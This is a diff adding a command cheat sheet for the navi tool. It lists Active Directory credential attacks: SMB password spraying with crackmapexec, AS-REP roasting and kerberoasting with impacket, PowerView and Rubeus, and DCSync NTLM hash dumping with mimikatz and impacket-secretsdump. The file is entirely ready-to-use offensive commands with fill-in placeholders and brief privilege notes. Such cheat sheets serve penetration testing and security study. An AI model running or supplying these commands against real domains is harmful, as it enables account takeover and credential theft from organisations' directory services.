@@ -1,0 +1,70 @@
+% crackmapexec, ad auth attacks, password attacks
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+
+# SMB password spray attack against AD host using crackmapexec
+crackmapexec smb <host_address> -u <username_or_userlist> -p '<password>' -d <domain> --continue-on-success
+
+% impacket, ad auth attacks, as-rep roasting
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+
+# Find users who have kerberos preauth disabled using impacket-GetNPUsers
+impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast <domain>/<username>
+
+% powerview, ad auth attacks, as-rep roasting
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+
+# Find users who have kerberos preauth disabled using PowerView
+Get-DomainUser -PreauthNotRequired
+
+% rubeus, ad auth attacks, kerberoasting
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+
+# Get hashes for SPNs using Rubeus (run from authenticated session)
+.\Rubeus.exe kerberoast /outfile:<OUTFILE>
+
+% impacket, ad auth attacks, kerberoasting
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+
+# Get hashes for SPNs using impacket
+sudo impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<username>
+
+% dcsync
+; dcsync
+; to perform a dcsync attack, the executing user needs to have the following rights:
+;  • Replicating Directory Changes
+;  • Replicating Directory Changes All
+;  • Replicating Directory Changes in Filtered Set
+;  by default, members of the following groups have these rights assigned:
+;  • Domain Admins
+;  • Enterprise Admins
+;  • Administrators
+
+% mimikatz, ad auth attacks, dcsync
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+
+# Get NTLM hash for user via dcsync attack using mimikatz 
+; to perform dcsync attack with mimikatz you will need the SeDebugPrivilege permission on top of the ones listed above
+lsadump::dcsync /user:<domain>/<username>
+
+% impacket, ad auth attacks, dcsync
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+
+# Get NTLM hash for user via dcsync attack using impacket-secretsdump
+impacket-secretsdump -just-dc-user <TARGET_USERNAME> <domain>/<USERNAME_TO_AUTH_AS>:"<password>"@<dc_ip>
+
+$ TARGET_USERNAME: if [[ -f "users.txt" ]]; then cat users.txt; fi
+$ USERNAME_TO_AUTH_AS: if [[ -f "users.txt" ]]; then cat users.txt; fi
